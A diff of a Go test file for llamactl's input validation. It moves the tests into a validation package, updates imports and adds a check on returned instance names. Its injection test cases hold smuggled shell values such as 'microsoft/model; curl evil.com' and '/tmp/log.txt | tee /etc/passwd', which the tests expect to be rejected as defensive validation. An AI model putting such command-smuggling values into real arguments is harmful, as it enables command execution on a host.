@@ -1,10 +1,12 @@
-package llamactl_test
+package validation_test
 
 import (
+	"llamactl/pkg/backends/llamacpp"
+	"llamactl/pkg/instance"
+	"llamactl/pkg/testutil"
+	"llamactl/pkg/validation"
 	"strings"
 	"testing"
-
-	llamactl "llamactl/pkg"
 )
 
 func TestValidateInstanceName(t *testing.T) {
@@ -39,16 +41,23 @@ func TestValidateInstanceName(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			err := llamactl.ValidateInstanceName(tt.input)
+			name, err := validation.ValidateInstanceName(tt.input)
 			if (err != nil) != tt.wantErr {
 				t.Errorf("ValidateInstanceName(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
+			}
+			if tt.wantErr {
+				return // Skip further checks if we expect an error
+			}
+			// If no error, check that the name is returned as expected
+			if name != tt.input {
+				t.Errorf("ValidateInstanceName(%q) = %q, want %q", tt.input, name, tt.input)
 			}
 		})
 	}
 }
 
 func TestValidateInstanceOptions_NilOptions(t *testing.T) {
-	err := llamactl.ValidateInstanceOptions(nil)
+	err := validation.ValidateInstanceOptions(nil)
 	if err == nil {
 		t.Error("Expected error for nil options")
 	}
@@ -73,13 +82,13 @@ func TestValidateInstanceOptions_PortValidation(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			options := &llamactl.CreateInstanceOptions{
-				LlamaServerOptions: llamactl.LlamaServerOptions{
+			options := &instance.CreateInstanceOptions{
+				LlamaServerOptions: llamacpp.LlamaServerOptions{
 					Port: tt.port,
 				},
 			}
 
-			err := llamactl.ValidateInstanceOptions(options)
+			err := validation.ValidateInstanceOptions(options)
 			if (err != nil) != tt.wantErr {
 				t.Errorf("ValidateInstanceOptions(port=%d) error = %v, wantErr %v", tt.port, err, tt.wantErr)
 			}
@@ -126,13 +135,13 @@ func TestValidateInstanceOptions_StringInjection(t *testing.T) {
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			// Test with Model field (string field)
-			options := &llamactl.CreateInstanceOptions{
-				LlamaServerOptions: llamactl.LlamaServerOptions{
+			options := &instance.CreateInstanceOptions{
+				LlamaServerOptions: llamacpp.LlamaServerOptions{
 					Model: tt.value,
 				},
 			}
 
-			err := llamactl.ValidateInstanceOptions(options)
+			err := validation.ValidateInstanceOptions(options)
 			if (err != nil) != tt.wantErr {
 				t.Errorf("ValidateInstanceOptions(model=%q) error = %v, wantErr %v", tt.value, err, tt.wantErr)
 			}
@@ -163,13 +172,13 @@ func TestValidateInstanceOptions_ArrayInjection(t *testing.T) {
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			// Test with Lora field (array field)
-			options := &llamactl.CreateInstanceOptions{
-				LlamaServerOptions: llamactl.LlamaServerOptions{
+			options := &instance.CreateInstanceOptions{
+				LlamaServerOptions: llamacpp.LlamaServerOptions{
 					Lora: tt.array,
 				},
 			}
 
-			err := llamactl.ValidateInstanceOptions(options)
+			err := validation.ValidateInstanceOptions(options)
 			if (err != nil) != tt.wantErr {
 				t.Errorf("ValidateInstanceOptions(lora=%v) error = %v, wantErr %v", tt.array, err, tt.wantErr)
 			}
@@ -181,13 +190,13 @@ func TestValidateInstanceOptions_MultipleFieldInjection(t *testing.T) {
 	// Test that injection in any field is caught
 	tests := []struct {
 		name    string
-		options *llamactl.CreateInstanceOptions
+		options *instance.CreateInstanceOptions
 		wantErr bool
 	}{
 		{
 			name: "injection in model field",
-			options: &llamactl.CreateInstanceOptions{
-				LlamaServerOptions: llamactl.LlamaServerOptions{
+			options: &instance.CreateInstanceOptions{
+				LlamaServerOptions: llamacpp.LlamaServerOptions{
 					Model:  "safe.gguf",
 					HFRepo: "microsoft/model; curl evil.com",
 				},
@@ -196,8 +205,8 @@ func TestValidateInstanceOptions_MultipleFieldInjection(t *testing.T) {
 		},
 		{
 			name: "injection in log file",
-			options: &llamactl.CreateInstanceOptions{
-				LlamaServerOptions: llamactl.LlamaServerOptions{
+			options: &instance.CreateInstanceOptions{
+				LlamaServerOptions: llamacpp.LlamaServerOptions{
 					Model:   "safe.gguf",
 					LogFile: "/tmp/log.txt | tee /etc/passwd",
 				},
@@ -206,8 +215,8 @@ func TestValidateInstanceOptions_MultipleFieldInjection(t *testing.T) {
 		},
 		{
 			name: "all safe fields",
-			options: &llamactl.CreateInstanceOptions{
-				LlamaServerOptions: llamactl.LlamaServerOptions{
+			options: &instance.CreateInstanceOptions{
+				LlamaServerOptions: llamacpp.LlamaServerOptions{
 					Model:   "/path/to/model.gguf",
 					HFRepo:  "microsoft/DialoGPT-medium",
 					LogFile: "/tmp/llama.log",
@@ -221,7 +230,7 @@ func TestValidateInstanceOptions_MultipleFieldInjection(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			err := llamactl.ValidateInstanceOptions(tt.options)
+			err := validation.ValidateInstanceOptions(tt.options)
 			if (err != nil) != tt.wantErr {
 				t.Errorf("ValidateInstanceOptions() error = %v, wantErr %v", err, tt.wantErr)
 			}
@@ -231,11 +240,11 @@ func TestValidateInstanceOptions_MultipleFieldInjection(t *testing.T) {
 
 func TestValidateInstanceOptions_NonStringFields(t *testing.T) {
 	// Test that non-string fields don't interfere with validation
-	options := &llamactl.CreateInstanceOptions{
-		AutoRestart:  boolPtr(true),
-		MaxRestarts:  intPtr(5),
-		RestartDelay: intPtr(10),
-		LlamaServerOptions: llamactl.LlamaServerOptions{
+	options := &instance.CreateInstanceOptions{
+		AutoRestart:  testutil.BoolPtr(true),
+		MaxRestarts:  testutil.IntPtr(5),
+		RestartDelay: testutil.IntPtr(10),
+		LlamaServerOptions: llamacpp.LlamaServerOptions{
 			Port:        8080,
 			GPULayers:   32,
 			CtxSize:     4096,
@@ -247,17 +256,8 @@ func TestValidateInstanceOptions_NonStringFields(t *testing.T) {
 		},
 	}
 
-	err := llamactl.ValidateInstanceOptions(options)
+	err := validation.ValidateInstanceOptions(options)
 	if err != nil {
 		t.Errorf("ValidateInstanceOptions with non-string fields should not error, got: %v", err)
 	}
-}
-
-// Helper functions for pointer fields
-func boolPtr(b bool) *bool {
-	return &b
-}
-
-func intPtr(i int) *int {
-	return &i
 }
